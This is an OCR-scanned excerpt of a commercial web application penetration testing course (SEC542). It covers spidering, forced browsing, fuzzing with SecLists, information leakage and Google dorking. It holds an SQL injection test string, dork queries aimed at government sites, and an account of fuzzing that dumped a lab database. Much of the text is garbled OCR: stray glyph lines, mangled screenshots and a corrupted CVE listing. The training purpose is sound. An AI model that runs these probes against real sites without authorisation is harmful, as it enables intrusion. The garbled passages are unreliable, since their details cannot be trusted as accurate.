Database-managers 
Operating-systems 
Implies 
PHP MySOl 
Alerts 
0 
ep ache.orq 
rnysql.corn 
php.net 
www.phpmyadmin.net 
ubuntu cornrbustnessjserve .. 
The Technology tab no longer appears as a ZAP default menu. (The ZAP interface was de-cluttered with the 
release of ZAP 2.4.0.) The Technology tab may be (temporarily) added by clicking the green plus("+") symbol 
on the right of the tabs. It may be pinned permanently by clicking the pin icon on the tab. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
49 
'-' 
\....,I 
ZAPForced··Browse 
ZAP Forced Browse is based on the (inactive) OWASP DirBuster 
Project 
• Dir Buster's functionality has now been incorporated directly into ZAP 
Seeks to find unlinked content 
• For example, a website has a /hidden directory that is not linked to or 
referenced anywhere else, locally or remotely 
Comes with a number of default wordlists 
• Can use other wordlists as well 
'-...,I 
'-...,I 
'-...,I 
'-,,I 
'-" 
'-" 
'----' 
'-...,I 
"---" 
'-...,I 
"---" 
'-" 
'-" 
"---" 
More information about OW AS P's retired DirBuster Project is available at 
https://www.owasp.org/index.php/Category:OW ASP_ Dir Buster _Project (https://cyber.gd/542 _244). 
The last released version ofDirBuster is also available in /opt/dirbuster in the Security542 Linux VM. 
ZAP's forced browse has three modes: 
Forced Browse Site: 
• 
Conducts a forced browse versus an entire site; for example, www.sec542.org. 
Forced Browse Directory: 
• 
Conducts a forced browse versus one directory; for example, www.sec542.org/docs. 
Forced Browse Directory (and children): 
• 
Conducts a recursive forced browse versus a directory and any discovered subdirectories; for example, 
www.sec542.org/docs, www.sec542.org/docs/pdf, www.sec542.org/docs/xls, www.sec542.org/docs/ppt, 
and more. 
50 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-" 
'-,,I
'-" 
'----' 
'-...,I 
'-" 
'-...,,' 
"---" 
'-" 
'-" 
"---" 
'-" 
'-" 
"---" 
"---" 
'-...,I 
"---" 
'-" 
"---" 
"---" 
"---" 
'-' 
\.....,I 
'-,,I 
'-'
Automated Spidering with the Burp Suite 
Burp Suite is a collection of tools for web 
penetration testing 
• Includes spidering capability 
Free basic version, commercial version with 
advanced features 
• We cover this tomorrow 
Using the spider is similar to ZAP: 
• Use a browser pointed at Burp as an interception proxy 
• Surf to the page we want to start spidering from 
• Switch to the spider tab in Burp, select "Spider running" to 
start 
• Or right-click the target in the site map and select "Spider 
this host" 
..- 
sq!i.php 
Oe!ete host 
B https;;Jwwvl.sec542.o I Copy UR_Ls _in this host 
I 
Copy !in.KS in this host 
I- Save <£~1~~.~~-d- Items 
, 
'S1t1;1 map help 
SEC542 j Web App Penetration Testing and Ethical Hacking 
SI 
Burp Suite is a collection of tools that includes an advanced web spider. You can download Burp from 
portswigger.net. Using the spider is similar to ZAP and Paros. We point our browser to the proxy port of Burp 
and browse to the starting point we want to launch the spider from. We then select the Spider tab within Burp 
and start it running. 
Burp Suite is available from https://portswigger.net/burp/ (https://cyber.gd/542_214) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
51 
'---' 
Automated Spidering with Wget 
• Wget is a console-based web 
browser 
• Runs on most platforms and 
has basic spidering capabilities 
• Wget saves each of the items 
retrieved 
o It saves them in a directory named 
after the website 
• Because it is a "well-behaved" spider, 
wget first downloads robots.txt and 
adheres to its directives 
o To ignore robots.bct, invoke with the -e 
robots=off option 
• The -r option invokes it to recurse 
through discovered links 
• The -1 [N] to specify maximum link 
recursion depth (default is 5) 
'Tctmt~i 
File 
Tt1'r~lfwt Tabs 
!:i~filf 
wget - r http:/ /WWW. sec542. org · l 3 
- -2015-01-04 07:45'46- - 
http://www.sec542.org/ 
Resolving www.sec542.org (www.sec542.org) ... 127.0.0.l 
connecting to www.sec542.org {www.sec542.org) 1127.e.o L] :80. 
connected. 
HTIP request sent, awaiting response . , . 20a OK 
Length: 1153 (l.lK) (text/html) 
saving to: 'www. sec542 .orgtindex. html' 
198%[-----~---------:-------------------, J 1,153 
- - , ·K/s 
in es 
. 1 
2815-(ll-04 07:45:•16 (205 MB/s) 
· 
·www.sec542.0rjl_/index.html' saved [1153/1153] 
'---' 
'-..../ 
'---' 
'-..../ 
'---' 
'-..../ 
'---' 
'-..../ 
'-..../ 
'---' 
'-..../ 
'-..., 
'-..../ 
'--' 
'-.,./ 
52 
I 
'-..../ 
Wget is a utility distributed as part of the GNU free software project. It is packaged with most modem Linux 
operating systems and has also been ported to Windows. 
The command shown above is: 
$ wget -r http://www.sec542.org -1 3 
This tells wget to recursively spider the website to a link depth of3. The "-I" is the letter ,Ju, 
'-.,./ 
'---' 
'-' 
'--' 
'---' 
'-' 
'-..../ 
The primary purpose ofwget is simply to retrieve content from websites, via HTTP, HTTPS, and FTP. Its 
popularity arises because it can be run non-interactively from the command line, meaning that it can be included 
in scripts or easily configured to run periodically without human intervention. (It's also free, which helps.) 
Wget can function as a simple spider, using the --recursive option. When using the -r option, wget extracts links 
from pages and downloads each linked page, recursively repeating this process until all resources have been 
downloaded or the maximum recursion depth set by the user has been reached. 
Wget includes many helpful options. For more information, see: 
GNUWget 
http://www.gnu.org/software/wget/ (https://cyber.gd/542 _ 215) QR 
52 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..../ 
'--' 
'--./ 
'--./ 
'-..., 
'-' 
'---' 
'-..../ 
'---' 
'--' 
'--' 
'-..../ 
~ 
'---' 
'-' 
Specialized Spidering Tools 
• There are also a number of tools that perform a spider and look 
for specific data 
• One of these is CeWL from Robin "digininja" Wood: 
o Custom Word List Generator 
o http:// digi.ninja 
• Ce WL spiders a website and then generates a word list for use as 
passwords or other dictionaries for attacks: 
o Grabs information from EXIF data 
SEC542 I Web App Penetration Testing and EthicalJ-lacking 
53 
One other type of tool we may use during a penetration test is a specialized spider. These spiders scan a website 
and return specific data that we need. For example, there are ones that return all the comments in a site or grab 
emails exposed. 
One of the most commonly used ones is CeWL by Robin Wood. CeWL, the Custom Word List Generator, 
spiders a website and generates a word list based on both the contents of the site and EXIF data from any images 
found. We can use these lists as passwords for any brute force attacks we want to perform. 
Reference: 
[l] http://digi.ninja/projects/cewl.php(https://cyber.gd/542 _ 216) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
53 
'-" 
'-" 
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
2. Exercise: Gathering Server Information 
3. Testing Software Configuration 
4. Shellshock 
5. Ex.ercise: Shellshock 
6. Spidering Web Applications 
7. Exercise: Web Spidering 
8. Analyzing Spidering Results 
9. Exercise: ZAP Forced Browse 
10. fuzzing 
I I. Information leakage 
12. Exercise: Directory Browsing 
13. Authentication 
14. Exercise; Authentication 
15. Username Harvesting 
16. Exercise: Username Harvesting 
Burp Intruder 
! 8. Exercise: fuzzing with Burp Intruder 
19. Summary 
SEC542 f Web App Penetration Testing and Ethical Hacking 
54 
'--" 
'-.,./ 
'---' 
'---' 
'---' 
'-.,./ 
'-.,./ 
'---' 
'-.,./ 
'-.,./ 
'-" 
'-.,./ 
'-.,./ 
'---' 
'-._,/ 
'---' 
Course Roadmap 
'-" 
'---' 
The next exercise demonstrates spidering web applications. 
'---' 
'---' 
'---' 
'-" 
'---' 
'-.,./ 
'---' 
'-' 
'-.J 
'---' 
'-' 
'-' 
"-- 
~ 
\....., 
\__. 
'-- 
54 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-- 
SEC542Workbook:Web Spidering 
-- _ 
" 
"- 
Exercise 2.3: Web Spidering 
SEC542 Workbook: Web Spidering 
Please go to Exercise 2.3 in the 542 Workbook. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
55 
'-._./ 
'---' 
'-._./ 
Course Roadmap 
··.··:·-·:_.-;:-._:_:-:-.-:-.-.-:·:-.-:-,.-.:-::-,_ .. ,,,.,,-,·, .... ·.:.:- .. 
CONFIGURATION. IDENTITY. AND 
AUTHORIZATION••·TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
2. Exercise: Gathering Server Information 
l. Testing Software Configuration 
4. Shellshoclc 
5. E:icercise: Shellshock 
6. Spidering W 
7. Exorcise: 
8. Analyzing S 
ems 
! I • Information Leakage 
12. Exercise: Directory Browsing 
13. Authentication 
14. Exercise: Authentication 
15. Userna.me Harvesting 
16. Exercise: Username Harvesting 
17. Burp Intruder 
l 8. Exei:,cise: Fuzzing with Burp Intruder 
r,. Summary 
'---' 
.__,, 
'----" 
'-' 
'----' 
'----" 
'------' 
'-._./ 
'------' 
Course Roadmap 
We will next analyze spidering results. 
56 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-..., 
'---" 
'-...,/ 
'----' 
'-...,/ 
.__,, 
'-' 
'---' 
'-----' 
'-..., · 
'-----' 
'--' 
'---' . 
. .___,, 
'----' 
..__,, 
'-" 
'----' 
'-._./
'-..., 
'-...,/ 
'-...,/ 
'-..., 
'-' 
'-' 
'-..., 
'----' 
'------' 
'--,/
Analyzing Spidering Results: What to Look For 
After we have spidered a site, we analyze the results to look 
£ 
. 
. 
. 
I d. 
I 
I 
or various items, inc u mg: 
I 
• Comments that reveal useful or sensitive information 
• Commented code and links 
• Disabled functionality 
• Linked servers 
o Such as content and application servers 
After you spider the site, you can look for various interesting tidbits. Some examples would be comments in the 
HTML, functionality that has been disabled, and servers that are linked to the application. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
57 
'--' 
'--' 
'--' 
HTML Comments 
• Web applications commonly contain comments in the HTML they send to the browser 
• Such comments are included in the server response and visible by the client: 
o Developer notes can reveal significant issues: 
"<!-- Don't forget to fix the auth bug-->" 
o Explanations of functionality: 
"//This function passes input to the query" 
o Explanations of variables: 
"/* Variable for user auth level 
... don't change! */" 
o Usernames and passwords: 
"<!-- The db user/pass is scott/tiger -->" 
• Such comments should be moved to server-side comments 
o For example, PHP would use <?php //Don't forget to fix the auth bug ?> 
o Of course, it could just fix the bug ... that's a much better approach! 
'-' 
'-.../ 
'-./ 
'-.../ 
'-' 
.'---' 
. .___,, 
'-/ 
'-.J 
'--' 
'-.../ 
.____,, 
'--' 
.____,, 
'-' 
.____,, 
Comments can be revealing. They can include everything from usernames and passwords to obscenities 
regarding management and particular languages. At the least, comments can provide information that can help 
you launch social engineering attacks. In many cases, they can also show you how the application works under 
the hood, or point you to parts of the application that have problems. For some reason, developers often forget 
that the end user can just click "View Source"! 
58 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'-' 
'-.../ 
'-' 
.____,,. 
'--' 
.____,, 
'-' 
.____,, 
'-.../ 
'-' 
'-.../ 
'-' 
'--' 
'-' 
'-' 
'-.../ 
.____,, 
'-._./ 
'-J 
'-J 
'--' 
Disabled Functionality 
• As web applications evolve, some developers leave behind 
disabled functionality 
• Disabled functionality often reveals previous or future sections of 
the site 
o These need to be tested and reported on 
- 
o Although officially "disabled," sometimes such functionality can be invoked 
o It may contain significant security weaknesses, as it often gets less 
attention than other components of a site or application 
o Even though "disabled," such functionality could lead to undermining the 
entire application 
As web applications grow and expand, some developers will leave disabled functionality within the application. 
We may find previous versions of the application or sections within it. Or we may get a sneak peek into new 
areas being built. 
" 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
59 
'----' 
Types· of Disabled Functionality 
Links that have been commented out 
• These links could link to older, future, or privileged pages 
• Most of the spidering tools list comments found 
Client-side code that has been commented out 
• This code could show how server-side code works 
• Functionality that was replaced by server-side code 
• Again, the tools we have discussed list comments and script code 
\_,I 
\_,I 
\.J 
'-../ 
'----' 
'----' 
'-../ 
'----' 
'----' 
'----' 
'-J 
'-J 
'----' 
'-J 
'-/ 
'-/ 
The first two items might appear to fall under the previous section of this course, that is, finding comments in 
HTML sent to the client. However, because these relate directly to functionality that appears to be either 
disabled or not working, they should be analyzed differently than the other types of comments. 
It is common to find links that have been commented out so they do not appear on the page or menu. As an 
attacker, I focus on these because most of the time they provide links to things the application owner doesn't 
mean for you to see. 
Older hidden pages contain functionality that hasn't been kept up to date. Because the most important part of 
session, authentication, and authorization is consistency, finding older pages that may not be as secure can 
enable us to abuse the application. 
Newer hidden pages are commonly found shortly before a site is updated. Developers will start uploading code 
in preparation, and by finding these pages, we have a chance of finding code that is not complete or is still being 
tested. It is common to have the test version of pages display troubleshooting information including queries 
being used. We can use this information to launch attacks. 
I 
Privileged pages are portions of the site that we are not authorized to access. Some applications verify the user's 
level of authorization and then display a menu. If you view the source, sometimes you can see links to 
administrative pages, which are commented out because the user does not have access. By browsing to the 
pages, you may find that the pages do not verify your authorization level. Brilliant! 
Code that has been commented out usually falls into one of two categories: 
60 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-J 
'-J 
'-J 
'-../ 
'-/ 
'----' 
'-J 
'-._/ 
'-J 
'-/ 
'-J 
'-J 
'-J 
'-' 
'--' 
'-../ 
'-J 
,_,, 
'-' 
'-J 
'-J 
'--' 
'--' 
'-../ 
'-./ 
'-J 
The first type is code that has been replaced by server-side code. By being able to see the client-side 
version, the attacker may be able to identify weaknesses in the code. 
The second type is code that is no longer used. This code may point at either functions or areas of the 
site that are no longer used. These sections of the site may be a weakness that can be exploited. 
These functions are interesting for a couple reasons. First, they may show a weakness that wasn't obvious 
before. And second, sometimes client-side functions are moved server side and then just dead-ended in the client 
code. This may give you a view into how the server-side code works. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
61 
-.._; 
'-...,I 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
I. Scanning with Nmap 
2. Exercise: Gathering Server Information 
3. Testing Software Configuration 
4. Shellshoclc 
S. Exercise: Shellshock 
6. Spidering Web Applications 
7. Exercise; Web '.mrtN·mp 
ft Analyzing Spidering Results 
9. Exercise: ZAP Forced Browse 
tO. Fuzzing 
I ! , Information leakage 
12. Exercise: Directory Browsing 
13. Authentication 
14. Exercise: Authentication 
IS. Username Harvesting 
I 6. Exercise: Usemame Harvesting 
17, Burp Intruder 
Exercise: .-u,L"-""' with Burp Intruder 
19. Summary 
SEC542 J \Afeb App Penetration Testing and Ethical Hacking 
62 
\..._; 
'-...,I 
'-'' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
'-J 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
Course Roadmap 
'-' 
'-' 
Let's use ZAP's forced browse functionality to discover unlinked content. 
'-J 
'-' 
'-' 
'-' 
'-' 
'-' 
'-' 
''-' 
'-' 
'-' 
'-' 
.._, 
''--' 
'-' 
'-' 
'-' 
'---' 
62 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'---' 
SEC542Workbook:ZAP Forced Browse 
_ 
- -=- - 
Exercise 2.4: ZAP Forced Browse 
SEC542 Workbook: ZAP Forced Browse 
Please go to Exercise 2.4 in the 542 Workbook 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
63 
'--' 
'--' 
'--" 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
Scanning with Nmap 
exerctse: Gathering 
Testing Software 
4. Shellshock 
5. Exercise: Shellshod< 
6. Spidering Web Applications 
7, Exercise; Web Spidering 
8. Analyzing Spidering Results 
9. Exercise: ZAP Forced Browse 
10. Fuzzing 
I I . Information leakage 
12. Exercise: Directory Browsinsr 
13. Authentication 
Exercise: Authentication 
IS, Username Harvesting 
16. Exercise: Username Harvesting 
17. Burp Intruder 
18. Exercise: Fuzzing with Burp Intruder 
19.Summary 
SEC542 I Web App Penetration Testing and Ethical Hacking 
64 
'---' 
'---' 
'--" 
'--../ 
'--../ 
'---' 
'-----' 
'---' 
'--" 
'-..../ 
'--" 
'---' 
'--../ 
'-----' 
'-./ 
'-' 
Course Roadmap 
'-----' 
'--.,/ 
We will next discuss fuzzing, a skill that will come in handy in the upcoming directory browsing and username 
harvesting exercises, 
64 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
'--../ 
'---' 
'-' 
'--.,/ 
'--" 
'--" 
'---' 
'---' 
'-' 
'--" 
'-' 
'--" 
'-" 
'--" 
'-..../ 
'-' 
'-' 
'-' 
Fuzzing 
Fuzzing is sending random or pseudorandom strings 
• Via the various inputs 
Web application penetration testing mainly uses attack strings or 
wordlists 
• Such as: ' or 1=1 -- 
• Or wordlists for username and/ or password guessing 
Fuzzing is a critical technique that will come in handy for the 
upcoming directory browsing and username harvesting exercises 
SEC542 I Web App Penetration Testing and Ethical Hacking 
Fuzzing is a technique used throughout all the various types of security testing. lt is used to quickly assess the 
various input points, looking for interesting results ... interesting to testers of course.© 
To perform a fuzzing attack, we would choose the various input points and send random or pseudo-random 
strings at the application. Once the inputs are all sent, we would look at the results to determine ifwe have any 
interesting results. For example, we could send various SQL strings and look for database error messages in the 
result set. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
65 
Examining•• Results 
Reviewing the results is mandatory 
• Tools can help but this depends on us 
We look for differences 
• Deviations from normal 
Work from a known good 
• From our spidering and forced browsing the application 
Look for errors and status code changes 
• Response size is also helpful 
'-..../ 
'----' 
'----' 
'----' 
'----' 
'----' 
'----' 
'-" 
'-" 
'----' 
'----' 
'----' 
·..._, 
'----' 
'--' 
'-../ 
To be useful, the results of fuzzing attempts must be reviewed. What we are looking for depends on the type of 
fuzzing that is being performed. Simple reflection of input, error messages, or perhaps status code changes could 
be useful information included in the results. Even subtle content changes or the size of the response could 
prove important. 
All of these results imply that you have a baseline of what constitutes normal results when not actively fuzzing 
data. 
66 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.../ 
'-" 
'--../ 
'--../ 
'--../ 
'----' 
'--' 
'-.J 
'-.J 
'----' 
'-../ 
'--../ 
'-.../ 
'-.../ 
._,, 
'-.../ 
'-.../ 
'-J 
'-.J 
'.J 
'-.../
'.J 
'--' 
SecLists 
SecLists contains a collection of high-quality web application penetration 
testing fuzzing sources (and more): 
SecLists is the security tester's companion. It is a collection of multiple types of lists used 
during security assessments. List types include usernames, passwords, URLs, sensitive 
data grep strings,fuzzing payloads, and many more.1 
• Installed in / opt/ seclists in the Securitygaz VM 
• Available at: https://github.com/danielmiessler/seclists (https://cyber.gd/542_249) 
• By @DanielMiessler 
SecLists incorporates data from FuzzDB and many other high-quality sources 
SecLists is a superset of high-quality fuzz lists. It incorporates data from FuzzDB, Jason Haddix (@Jhaddix), 
Robert Hansen (@rsnake), Rodolfo Assis (@brutelogic) and many others. 
You can check out Sec Lists locally; it's installed the Security542 VM in /opt/seclists. 
One example (of many) of useful data contained in SecLists: The top 1000 female, male, and family names (last 
names or surnames) in the US: 
• 
/opt/seclists/U semames/N am es/top_ 1000 _ usa _ femalenames _ engl ish. txt 
• 
/opt/sec I ists/U semames/N am es/top_ l 000 _ usa _ familynames _ english. txt 
• 
/opt/seclists/Usemames/Names/top _ l 000 _ usa _ malenames _ english.txt 
FuzzDB is also installed in /opt/fuzzdb in the Security542 VM and is available at https://github.com/fuzzdb- 
project/fuzzdb (https:/ /cyber.gd/542 _ 245) 
Reference: 
[ 1] https://github.com/danielmiessler/seclists (https://cyber.gd/542 _ 249) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
67 
'-../ 
,.__, 
• As noted during 542.1, ZAP's fuzzer was significantly improved as of version 2-4 
o It is now "professional grade" and very fast 
o Many professionals ignore ZAP's fuzzer and exclusively use Burp Intruder (which is also great) 
o We will discuss Burp Intruder in detail at the end of 542.2, including a hands-on Sniper lab 
ZAP's new fuzzer is wonderful and quite easy to use. That wasn't always the case, but ZAP versions 2.4+ 
include the "Advanced Fuzzer," which is professional grade. Many 542 students who have used Burp 
exclusively gain a newfound respect for ZAP after completing the Security 542 labs, and wind up using ZAP 
professionally after the class. 
The screenshot above shows the configuration of a fuzzing attack vs. this URL: 
http://www. sec542. org/sqli .php?name=test. We fuzzed on the "name" field and used the 
"Generic_SQLi" list from SecLists, available in /opt/seclists/Fuzzing/Generic_ SQLi. 
Here are the results, sorted by length. Ten of the fuzzing injections dumped the entire database table (note that 
we will discuss SQL injection in detail during 542.3). 
68 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-J 
'-J 
'-J 
'-J 
'-J 
'-' 
'-J 
'-../ 
'-../ 
'-J 
'-../ 
'-../ 
'-J 
'-../ 
68 
I 
,.__, 
'-../ 
'-J 
,.__, 
'-../ 
,.__, 
'-../ 
'-' 
'-J 
'-../ 
'---' 
·------ 
'--' 
'-J 
'-J 
'-../ 
'-J 
'-J 
'---' 
'-../ 
'--' 
'-..,I 
,.__, 
'-../ 
''-" 
Course Roadmap 
CONFIGURATION, IDENTITY, AND 
AUTHORIZATION TESTING 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
I. Scanning with Nmap 
Exercise: Gathering 
Information 
3. Testing Software Configuration 
4. Shellshock 
5. Exercise: Shellshock 
6. Spidering Web Applications 
7. Exercise: Web Spidering 
8. Analyzing Spidering Results 
9. Exercise: ZAP Forced Browse 
IO. Fuzzing 
I I. Information Leakage 
I 2. Exercise: Directory Browsing 
13. Authentication 
14. Exercise: Authentication 
15. Username Harvesting 
16. 1F1<1src1<:P, Username Harvesting 
17. Burp Intruder 
Burp Intruder 
SEC542 I Web App Penetration l"estingand 
Course Roadmap 
We will next discuss information leakage. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
69 
'--' 
OTG-CONFIG-004:.Review Unreferenced Filesfor•Sensitive Information 
"While most of the files within a web server are 
directly haruiledbi; the server itself, it isn't 
uncommon to find unreferenced orforgottenfiles 
that can be used to obtain important information 
about the infrastructure or the credentials: "1 
'-..,I 
'-..,I 
'-..,I 
'-.__./ 
'-' 
'-' 
'---" 
'-' 
'---" 
'-' 
'-' 
'-' 
'---" 
'--' 
'-' 
SEC542/ 
The purpose of OTG-CONFIG-004 is to discover whether the application unintentionally exposes files without 
proper access control. 
Reference: 
[1] https://www.owasp.org/index.php/Review _ Old,_ Backup_ and_ Unreferenced _Files_ 
for_ Sensitive _Information _(OTG-CONFIG-004) (https://cyber.gd/542 _ 156) QR 
70 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--' 
'--' 
'--' 
'--' 
'--' 
'-' 
'--' 
'--' 
'--' 
'---" 
'-' 
'--' 
'--' 
'-' 
'-" 
'--' 
'-" 
'--' 
'--' 
'-.__./ 
'---" 
'-' 
'-' 
'--' 
'-' 
'-' 
Information Leakage 
Information leakage flaws provide additional reconnaissance data 
that can be quite useful during penetration tests 
• These flaws do not typically lead directly to exploitation 
The information gathered during this stage is typically used as an 
input to later steps: 
• SQL injection, password guessing, and more 
You have an error in your SQL syntax; check the manual that 
corresponds to your MySQL server version for the right syntax to use 
near ""' at line l 
71 
In the screenshot, we entered a single quote in the following form: http://www.sec542.org/scanners/sqli.php. 
We now know we are facing a MySQL database backend, and we also know the programmer has not performed 
proper bounds checking. 
These types of errors are easy to search for; for example, a Google search for "'Microsoft OLE DB Provider for 
ODBC Drivers' site:gov" revealed this USGS.gov site (Note: We simply surfed here and performed no other 
actions): 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
71 
'--..,I 
Types/of·lnformation• Leakage 
v 
'---' 
'-..,,· 
Common types of information 
leakage: 
• Valid users 
• The type of SQL database in use 
• Database schema 
• Underlying directory structure 
• OS and service versions 
• ... and much more 
Information leakage flaws are quite common and help narrow the focus of later attack stages, including 
username guessing and SQL injection. Both OS and service version information are part of vulnerability 
scanning and serve as inputs in the exploitation phase. 
Surfing to http://www.sec542.org/~adent/phpinfo.php reveals the following (partial list): 
• 
Full Linux kernel version: 
• 
Linux Security542 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:44 UTC 2014 i686 
• 
PHP Configuration file and directory, plus underlying directory structure: 
• 
/etc/php5/apache2/php.ini 
• 
Username and uid of the web server: 
• 
www-data(33)/33 
• 
Web root: 
• 
/var/www/html 
• 
Use ofMySQL and MySQL version: 
• 
5.5.40 
'-' 
'-' 
'--..,, 
'--..,, 
'-' 
'-' 
'-" 
'-' 
'-._,/ 
'-._,/ 
'---' 
'-J 
'-J 
'--..,, 
'-J 
'--..., 
'-J 
'-._,/ 
'-' 
'-J 
'-J 
'-' 
'-' 
'-J 
'-J 
'-' 
'-._,,' 
'-' 
'-' 
'-' 
'-../ 
'-....,I 
'-../ 
'-' 
\J
72 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-._,/
'-' 
• Directory browsing is a common 
information leakage flaw 
o Enables the attacker to "break out" of 
the web server and surf the 
underlying file system 
• Quick/easy Apache/nginx test: 
o Surf to the site's /images directory 
• Note the difference between: 
o secsaz.org/images 
o sec542.com/images 
N.atne 
Last· modllif:d ~ Descrtptton 
., l:itl:llJltill~ 
ii ;li:l,JllllI 
2015-01-02 12,07 453!( 
Forbidden 
Yoo don't have permission to access /linages/ on this server; 
Apache/2,4.7 (Ubuntu) Server at sec-542.com Port 80 
You may test this difference yourself by surfing to: 
• 
http://sec542.org/images 
• 
http://sec542.com/images 
sec542.com has forbidden directory indexing (HTTP status code 403). 
This screenshot indicates that the /images directory may exist on sec542.com, but we are forbidden from 
browsing it. We receive a Not Found (HTTP status code 404) message when attempting to view a nonexistent 
directory (http:// sec54 2. com/images2): 
The requested URL /images2 was not found on this server. 
Apache/2.4.7 (Ubuntu) Server at sec542.com Port 80 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
73 
'-" 
'-..,I 
Google .. Searching for D.irectory•• Browsing 
• There are many Google Hacks (aka 
Google Dorks) for discovering 
information leakage flaws 
• For example, search for: 
o site:gov intitle:"Index of' "last modified" 
• Check out the Google Hacking Database 
for lots more: 
o https://www.exploit-db.com/google-hacking- 
database/ 
o Hours of entertainment! 
• Be careful of Google shunning 
o Google has been shunning more aggressively 
lately 
The screenshot is Google's immediate response to the search: 
inurl:"phpinfo.php" 
74 
'----" 
'----" 
Be careful with Google Hacks. Although useful (and often entertaining), Google shuns requests it views as 
malicious. In that case, Google redirects to a CAPTCHA page, which is designed to determine if you are a 
human or a bot/script. 
The shun comes in a number of flavors, ranked in order of severity: 
Immediate one-page shun for a malicious request (see below) 
Short-term (1--4 hours) shun for a series ofrequests viewed as malicious 
• 
There is an unconfirmed third level: Permanent ban of the offending IP address from all Google 
services, forever, after repeated short-term shuns, typically due to continued automated scraping of 
google.com (ouch!) 
To continue, please type the characters below: 
1~1 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'---' 
'-' 
'----". 
'-" 
'-,/ 
'-,/ 
'-.../ 
'-.../ 
'-.../ 
'---' 
'-.../. 
'-.../ 
'-,/ 
'-.../ 
'-.../ 
'----" 
'-' 
'-,/ 
'-.../ 
'-.../ 
-.__., 
'-,/ 
'-.../ 
'-.../ 
'-' 
'----" 
-.__., 
'-.../ 
'-.../ 
'----" 
'-" 
'--' 
'-.-/ 
'-' 
'-.../ 
\..J 
Searching for Information Leakage Flaws 
Search for CVEs containing the word "leakage": 
• http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=leakage 
Name 
;..-v1;;:~_w1.~.l'.tft$ 
oe,scri11rfon 
HP ceetralview r'rau<l Risk Mana-9enwnt 11.1, 1L2, and ll.3; centrafview Revenue 
teakeee centrer 4, 1, 4.2, and 4.3; Centratview Dealer Performance Audit 2.0 and 2 .. 1; 
Centralv1ew Credit Risk Controf 2.1, 2.2, a1'ld 2.3; CentraMe.v; Reaming Fraud Control 
2.1. 2.2, and 2..3; and cersrarvtew subscripticn Fraud Prevention 2.0 and 2.1 allow 
rernct e attackers to obtain sensrtfve Intormaticn via unspecified vectors, s different 
vu1nf2rabiHty than. CVE-2015 ... 5406 and CVf-201$-5407. 
HP C~rttra!View fraud Risk r-1aoag.en\e'nt 11.1. 11.2:, and 11.3; Centralview Revenue 
Ut.akaga. Control 4.1, 4.2, aud 4,3; C~ntr.aMew De:ai~r PErfomuni:::~ A.edit 2.0 and 2.1; 
CentrallJiew Credit Risk Control 2.1, 2.21 aod 2.J~ CentralView Rcamlo:9 Fraud Control 
2.1, 2.2, and 2.3; and reotratvlew Subsoipticn fr,;md Prevention 2,Q and 2:.1 allow 
remote attackers to obtain sensitive tntcrrnetlcn via unspecified vectors, a different 
v~fnerabtilty than CV-E-2015·5406 ar;d CVE-2015-54'.)S. 
HP <:entra!View frav.<t Risk Nanaqement 11.1, 11.2:, and 1 L3; ceotrarvrew Revenue 
leakage Contrct 4.1# 4.2, and 4.3~ centralvtew Dealer Performanc.e Audit 2.0 ard 2.1; 
cerrrelvew Credit Risk Ccrttroi 2.11 2..2, and 2.3; Centralview Roaming Fraud Cantrel 
